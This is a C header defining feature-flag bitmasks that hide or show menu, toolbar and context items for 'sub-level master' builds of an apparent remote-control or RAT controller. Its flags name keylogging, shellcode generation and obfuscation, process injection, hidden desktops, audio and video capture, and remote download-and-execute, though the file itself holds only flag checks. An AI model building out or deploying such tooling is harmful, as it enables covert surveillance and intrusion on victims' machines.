#pragma once

// ============================================================
//  FeatureFlags.h - Runtime Feature Flags for Sub-level Control
// ============================================================
//
//  This file defines the data structures and bit flags for
//  controlling which features are available to sub-level masters.
//
//  These flags are written into g_UpperHash[164-255] when
//  generating a sub-level master program (92 bytes total).
//
// ============================================================

#include <stdint.h>
#include <string.h>

#define FEATURE_FLAGS_VERSION   "FLG1"
#define FEATURE_FLAGS_OFFSET    164     // Offset in g_UpperHash

#pragma pack(push, 1)
typedef struct FeatureFlags {
    char     Version[4];      // "FLG1" version identifier
    uint64_t MenuFlags;       // Main menu flags (64 bits)
    uint64_t ToolbarFlags;    // Toolbar flags (64 bits)
    uint64_t ContextFlags;    // Context menu flags (64 bits)
    char     Reserved[64];    // Reserved for future use
} FeatureFlags;  // 4 + 8 + 8 + 8 + 64 = 92 bytes
#pragma pack(pop)


// ============================================================
//  MenuFlags bit definitions (corresponds to HIDE_MENU_* macros)
// ============================================================

// File menu [0-3]
#define MF_SETTINGS           (1ULL << 0)   // HIDE_MENU_SETTINGS
#define MF_NOTIFY_SETTINGS    (1ULL << 1)   // HIDE_MENU_NOTIFY_SETTINGS
#define MF_WALLET             (1ULL << 2)   // HIDE_MENU_WALLET
#define MF_NETWORK            (1ULL << 3)   // HIDE_MENU_NETWORK

// Tools menu [4-10]
#define MF_INPUT_PASSWORD     (1ULL << 4)   // HIDE_MENU_INPUT_PASSWORD
#define MF_IMPORT_LICENSE     (1ULL << 5)   // HIDE_MENU_IMPORT_LICENSE
#define MF_RCEDIT             (1ULL << 6)   // HIDE_MENU_RCEDIT
#define MF_GEN_AUTH           (1ULL << 7)   // HIDE_MENU_GEN_AUTH
#define MF_GEN_MASTER         (1ULL << 8)   // HIDE_MENU_GEN_MASTER
#define MF_LICENSE_MGR        (1ULL << 9)   // HIDE_MENU_LICENSE_MGR
#define MF_V2_PRIVATEKEY      (1ULL << 10)  // HIDE_MENU_V2_PRIVATEKEY

// ShellCode submenu [11-19]
#define MF_SHELLCODE_C        (1ULL << 11)  // HIDE_MENU_SHELLCODE_C
#define MF_SHELLCODE_BIN      (1ULL << 12)  // HIDE_MENU_SHELLCODE_BIN
#define MF_SHELLCODE_LOAD_TEST (1ULL << 13) // HIDE_MENU_SHELLCODE_LOAD_TEST
#define MF_SHELLCODE_OBFS     (1ULL << 14)  // HIDE_MENU_SHELLCODE_OBFS
#define MF_SHELLCODE_OBFS_BIN (1ULL << 15)  // HIDE_MENU_SHELLCODE_OBFS_BIN
#define MF_SHELLCODE_OBFS_TEST (1ULL << 16) // HIDE_MENU_SHELLCODE_OBFS_TEST
#define MF_SHELLCODE_AES_C    (1ULL << 17)  // HIDE_MENU_SHELLCODE_AES_C
#define MF_SHELLCODE_AES_BIN  (1ULL << 18)  // HIDE_MENU_SHELLCODE_AES_BIN
#define MF_SHELLCODE_AES_TEST (1ULL << 19)  // HIDE_MENU_SHELLCODE_AES_TEST

// Params menu [20-27]
#define MF_KBLOGGER           (1ULL << 20)  // HIDE_MENU_KBLOGGER
#define MF_LOGIN_NOTIFY       (1ULL << 21)  // HIDE_MENU_LOGIN_NOTIFY
#define MF_ENABLE_LOG         (1ULL << 22)  // HIDE_MENU_ENABLE_LOG
#define MF_PRIVACY_WALLPAPER  (1ULL << 23)  // HIDE_MENU_PRIVACY_WALLPAPER
#define MF_FILE_V2            (1ULL << 24)  // HIDE_MENU_FILE_V2
#define MF_HOOK_WIN           (1ULL << 25)  // HIDE_MENU_HOOK_WIN
#define MF_RUN_AS_SERVICE     (1ULL << 26)  // HIDE_MENU_RUN_AS_SERVICE
#define MF_RUN_AS_USER        (1ULL << 27)  // HIDE_MENU_RUN_AS_USER

// Extension menu [28-37]
#define MF_HISTORY_CLIENTS    (1ULL << 28)  // HIDE_MENU_HISTORY_CLIENTS
#define MF_BACKUP_DATA        (1ULL << 29)  // HIDE_MENU_BACKUP_DATA
#define MF_IMPORT_DATA        (1ULL << 30)  // HIDE_MENU_IMPORT_DATA
#define MF_RELOAD_PLUGINS     (1ULL << 31)  // HIDE_MENU_RELOAD_PLUGINS
#define MF_PLUGIN_REQUEST     (1ULL << 32)  // HIDE_MENU_PLUGIN_REQUEST
#define MF_FRPS_FOR_SUB       (1ULL << 33)  // HIDE_MENU_FRPS_FOR_SUB
#define MF_CHANGE_LANG        (1ULL << 34)  // HIDE_MENU_CHANGE_LANG
#define MF_CHOOSE_LANG_DIR    (1ULL << 35)  // HIDE_MENU_CHOOSE_LANG_DIR
#define MF_LOCATION_QQWRY     (1ULL << 36)  // HIDE_MENU_LOCATION_QQWRY
#define MF_LOCATION_IP2REGION (1ULL << 37)  // HIDE_MENU_LOCATION_IP2REGION

// Help menu [38-42]
#define MF_IMPORTANT          (1ULL << 38)  // HIDE_MENU_IMPORTANT
#define MF_FEEDBACK           (1ULL << 39)  // HIDE_MENU_FEEDBACK
#define MF_WHAT_IS_THIS       (1ULL << 40)  // HIDE_MENU_WHAT_IS_THIS
#define MF_MASTER_TRAIL       (1ULL << 41)  // HIDE_MENU_MASTER_TRAIL
#define MF_REQUEST_AUTH       (1ULL << 42)  // HIDE_MENU_REQUEST_AUTH

// [43-63] Reserved


// ============================================================
//  ToolbarFlags bit definitions (corresponds to HIDE_TOOLBAR_* macros)
// ============================================================

#define TF_TERMINAL           (1ULL << 0)   // HIDE_TOOLBAR_TERMINAL
#define TF_PROCESS            (1ULL << 1)   // HIDE_TOOLBAR_PROCESS
#define TF_WINDOW             (1ULL << 2)   // HIDE_TOOLBAR_WINDOW
#define TF_DESKTOP            (1ULL << 3)   // HIDE_TOOLBAR_DESKTOP
#define TF_FILE               (1ULL << 4)   // HIDE_TOOLBAR_FILE
#define TF_AUDIO              (1ULL << 5)   // HIDE_TOOLBAR_AUDIO
#define TF_VIDEO              (1ULL << 6)   // HIDE_TOOLBAR_VIDEO
#define TF_SERVICE            (1ULL << 7)   // HIDE_TOOLBAR_SERVICE
#define TF_REGISTER           (1ULL << 8)   // HIDE_TOOLBAR_REGISTER
#define TF_KEYBOARD           (1ULL << 9)   // HIDE_TOOLBAR_KEYBOARD
#define TF_SETTINGS           (1ULL << 10)  // HIDE_TOOLBAR_SETTINGS
#define TF_BUILD              (1ULL << 11)  // HIDE_TOOLBAR_BUILD
#define TF_SEARCH             (1ULL << 12)  // HIDE_TOOLBAR_SEARCH
#define TF_HELP               (1ULL << 13)  // HIDE_TOOLBAR_HELP

// [14-63] Reserved


// ============================================================
//  ContextFlags bit definitions (corresponds to HIDE_CTX_* macros)
// ============================================================

// Online list context menu [0-21]
#define CF_MESSAGE            (1ULL << 0)   // HIDE_CTX_MESSAGE
#define CF_UPDATE             (1ULL << 1)   // HIDE_CTX_UPDATE
#define CF_DELETE             (1ULL << 2)   // HIDE_CTX_DELETE
#define CF_SHARE              (1ULL << 3)   // HIDE_CTX_SHARE
#define CF_PROXY              (1ULL << 4)   // HIDE_CTX_PROXY
#define CF_HOSTNOTE           (1ULL << 5)   // HIDE_CTX_HOSTNOTE
#define CF_VIRTUAL_DESKTOP    (1ULL << 6)   // HIDE_CTX_VIRTUAL_DESKTOP
#define CF_GRAY_DESKTOP       (1ULL << 7)   // HIDE_CTX_GRAY_DESKTOP
#define CF_REMOTE_DESKTOP     (1ULL << 8)   // HIDE_CTX_REMOTE_DESKTOP
#define CF_H264_DESKTOP       (1ULL << 9)   // HIDE_CTX_H264_DESKTOP
#define CF_AUTHORIZE          (1ULL << 10)  // HIDE_CTX_AUTHORIZE
#define CF_UNAUTHORIZE        (1ULL << 11)  // HIDE_CTX_UNAUTHORIZE
#define CF_ASSIGN_TO          (1ULL << 12)  // HIDE_CTX_ASSIGN_TO
#define CF_ADD_WATCH          (1ULL << 13)  // HIDE_CTX_ADD_WATCH
#define CF_LOGIN_NOTIFY       (1ULL << 14)  // HIDE_CTX_LOGIN_NOTIFY
#define CF_RUN_AS_ADMIN       (1ULL << 15)  // HIDE_CTX_RUN_AS_ADMIN
#define CF_UNINSTALL          (1ULL << 16)  // HIDE_CTX_UNINSTALL
#define CF_PRIVATE_SCREEN     (1ULL << 17)  // HIDE_CTX_PRIVATE_SCREEN
#define CF_REGROUP            (1ULL << 18)  // HIDE_CTX_REGROUP
#define CF_INJ_NOTEPAD        (1ULL << 19)  // HIDE_CTX_INJ_NOTEPAD
#define CF_PROXY_PORT         (1ULL << 20)  // HIDE_CTX_PROXY_PORT
#define CF_PROXY_PORT_STD     (1ULL << 21)  // HIDE_CTX_PROXY_PORT_STD

// Machine management submenu [22-24]
#define CF_MACHINE_SHUTDOWN   (1ULL << 22)  // HIDE_CTX_MACHINE_SHUTDOWN
#define CF_MACHINE_REBOOT     (1ULL << 23)  // HIDE_CTX_MACHINE_REBOOT
#define CF_MACHINE_LOGOUT     (1ULL << 24)  // HIDE_CTX_MACHINE_LOGOUT

// Execute command submenu [25-28]
#define CF_EXECUTE_DOWNLOAD   (1ULL << 25)  // HIDE_CTX_EXECUTE_DOWNLOAD
#define CF_EXECUTE_UPLOAD     (1ULL << 26)  // HIDE_CTX_EXECUTE_UPLOAD
#define CF_EXECUTE_TESTRUN    (1ULL << 27)  // HIDE_CTX_EXECUTE_TESTRUN
#define CF_EXECUTE_GHOST      (1ULL << 28)  // HIDE_CTX_EXECUTE_GHOST

// [29-63] Reserved


// ============================================================
//  Access functions
// ============================================================

// Get feature flags (returns nullptr if not present or invalid)
inline const FeatureFlags* GetFeatureFlags() {
    extern char g_UpperHash[];
    const char* ptr = g_UpperHash + FEATURE_FLAGS_OFFSET;
    if (memcmp(ptr, FEATURE_FLAGS_VERSION, 4) != 0)
        return nullptr;
    return (const FeatureFlags*)ptr;
}

// Check if a menu item is disabled at runtime
inline bool IsMenuDisabled(uint64_t flag) {
    const FeatureFlags* ff = GetFeatureFlags();
    return ff && (ff->MenuFlags & flag);
}

// Check if a toolbar button is disabled at runtime
inline bool IsToolbarDisabled(uint64_t flag) {
    const FeatureFlags* ff = GetFeatureFlags();
    return ff && (ff->ToolbarFlags & flag);
}

// Check if a context menu item is disabled at runtime
inline bool IsContextDisabled(uint64_t flag) {
    const FeatureFlags* ff = GetFeatureFlags();
    return ff && (ff->ContextFlags & flag);
}


// ============================================================
//  Helper macros for combined compile-time and runtime check
// ============================================================

#define SHOULD_HIDE_MENU(compile_flag, runtime_flag) \
    ((compile_flag) || IsMenuDisabled(runtime_flag))

#define SHOULD_HIDE_TOOLBAR(compile_flag, runtime_flag) \
    ((compile_flag) || IsToolbarDisabled(runtime_flag))

#define SHOULD_HIDE_CTX(compile_flag, runtime_flag) \
    ((compile_flag) || IsContextDisabled(runtime_flag))
